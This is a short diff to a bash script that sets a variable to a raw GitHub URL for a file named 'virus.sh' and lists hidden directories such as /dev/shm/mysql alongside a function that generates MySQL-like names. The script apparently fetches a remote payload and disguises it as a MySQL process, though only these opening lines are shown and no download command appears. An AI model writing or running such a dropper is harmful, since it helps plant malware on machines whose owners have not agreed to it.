@@ -1,6 +1,6 @@
 #!/bin/bash
 
-GITHUB_SCRIPT_URL=""
+GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/him1k0ta/test/main/virus.sh"
 MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")
 
 generate_mysql_name() {
